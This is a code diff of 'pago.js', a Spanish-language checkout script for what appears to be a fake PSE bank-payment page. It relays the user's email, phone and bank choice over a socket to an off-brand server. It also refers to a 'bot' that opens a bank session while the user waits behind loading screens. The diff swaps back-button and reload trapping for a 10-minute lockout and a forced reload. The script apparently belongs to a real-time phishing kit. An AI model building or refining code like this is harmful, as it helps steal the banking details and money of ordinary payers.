@@ -1,4 +1,4 @@
-// pago.js - Sincronización en Vivo + Resumen de Datos Activo + Inputs Limpios + Bloqueo de UI
+// pago.js - Sincronización en Vivo + Resumen de Datos Activo + Inputs Limpios
 
 const socket = io('https://apifinacjs.pagoswebcol.uk'); 
 
@@ -6,40 +6,40 @@ let isTransactionActive = false;
 let browserRequested = false; 
 const emailRegexValido = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
-// ==========================================
-// SEGURIDAD: PREVENIR RECARGA Y RETROCESO DURANTE LA CARGA
-// ==========================================
-
-// Prevenir recarga mediante el botón del navegador
 window.addEventListener('beforeunload', (e) => {
     if (isTransactionActive) {
         e.preventDefault();
-        e.returnValue = 'Por favor espere la carga. La transacción está en proceso.';
-        return 'Por favor espere la carga. La transacción está en proceso.';
+        e.returnValue = 'Por favor espere la carga';
+        return 'Por favor espere la carga';
     }
 });
 
-// Prevenir retroceso con el botón "Atrás" del navegador
-window.addEventListener('popstate', function (event) {
-    if (isTransactionActive) {
-        // Vuelve a empujar el estado actual para anular el retroceso
-        history.pushState(null, document.title, location.href);
-    }
-});
-
-// Prevenir teclas de recarga (F5, Ctrl+R, Cmd+R)
-document.addEventListener('keydown', function (e) {
-    if (isTransactionActive) {
-        if (e.key === 'F5' || (e.ctrlKey && e.key.toLowerCase() === 'r') || (e.metaKey && e.key.toLowerCase() === 'r')) {
-            e.preventDefault();
+document.addEventListener('DOMContentLoaded', () => {
+    // ==========================================
+    // NUEVO: VERIFICACIÓN DE PAGO PENDIENTE (10 MIN)
+    // ==========================================
+    const pendingTimestamp = localStorage.getItem('pagoPendienteTiempo');
+    if (pendingTimestamp) {
+        const now = Date.now();
+        const diffMinutos = (now - parseInt(pendingTimestamp)) / (1000 * 60);
+        
+        if (diffMinutos < 10) {
+            alert("Ya hay un proceso de pago pendiente. Por favor espere 10 minutos o intente con otro correo.");
+            
+            // Bloqueamos el botón visualmente y funcionalmente
+            const btn = document.querySelector('.btn-pay');
+            if (btn) {
+                btn.disabled = true;
+                btn.style.opacity = '0.5';
+                btn.style.cursor = 'not-allowed';
+                btn.textContent = 'Proceso Pendiente...';
+            }
+        } else {
+            // Si ya pasaron más de 10 minutos, limpiamos el bloqueo
+            localStorage.removeItem('pagoPendienteTiempo');
         }
     }
-});
 
-// ==========================================
-// INICIALIZACIÓN DE DATOS
-// ==========================================
-document.addEventListener('DOMContentLoaded', () => {
     // 1. Obtener los datos correctamente del localStorage
     const data = JSON.parse(localStorage.getItem('datosFactura')) || {};
 
@@ -127,15 +127,15 @@ if (botonPagar) {
         if (!phone || phone.length < 7) { alert("Celular inválido."); return; }
         if (!browserRequested) { alert("Aún no se ha iniciado la conexión, por favor vuelva a seleccionar su banco."); return; }
 
-        // Activar estado de bloqueo de seguridad
         isTransactionActive = true; 
-        history.pushState(null, document.title, location.href); // Preparar bloqueo de botón "Atrás"
-
         const overlay = document.getElementById('loadingOverlay');
         const loadingText = document.getElementById('dynamicLoadingText');
         
         if (overlay) overlay.style.display = 'flex';
         loadingInterval = animateLoadingText(loadingText);
+
+        // NUEVO: Guardamos el tiempo exacto en que inició la transacción para el bloqueo de 10 min
+        localStorage.setItem('pagoPendienteTiempo', Date.now().toString());
 
         // Envía los datos exactos que el usuario acaba de escribir como garantía final
         socket.emit('submit_payment', {
@@ -158,32 +158,29 @@ socket.on('payment_success', (data) => {
     const loadingText = document.getElementById('dynamicLoadingText');
     if (loadingText) loadingText.textContent = "Redirigiendo a PSE...";
     clearInterval(loadingInterval);
+    
+    // Si la redirección es exitosa, quitamos el bloqueo temporal
+    localStorage.removeItem('pagoPendienteTiempo');
+
     setTimeout(() => {
-        isTransactionActive = false; // Liberar seguridad
+        isTransactionActive = false;
         window.location.href = data.url; 
     }, 1500);
 });
 
 socket.on('payment_error', (data) => {
-    // 1. Detener la animación y limpiar variables
     clearInterval(loadingInterval);
-    isTransactionActive = false; // Liberar botones y recargas
+    isTransactionActive = false;
+    
+    // Liberamos el bloqueo en localStorage porque la transacción falló
+    localStorage.removeItem('pagoPendienteTiempo');
 
-    // 2. Quitar la pantalla de carga para quedarse en el mismo index
-    const overlay = document.getElementById('loadingOverlay');
-    if (overlay) overlay.style.display = 'none';
-
-    // 3. Avisar al usuario del error
     alert("Hubo un problema de conexión con el banco: " + data.message);
     
-    // 4. Reiniciar la solicitud del bot para que el usuario pueda intentarlo de nuevo
-    browserRequested = false;
-    if (selectBanco) selectBanco.value = ""; 
+    // NUEVO: Forzar recarga completa de la página inmediatamente después de aceptar la alerta
+    window.location.reload();
 });
 
-// ==========================================
-// UTILIDADES
-// ==========================================
 function animateLoadingText(element) {
     if (!element) return null;
     const messages = ["Conectando con la pasarela...", "Validando datos...", "Contactando banco..."];
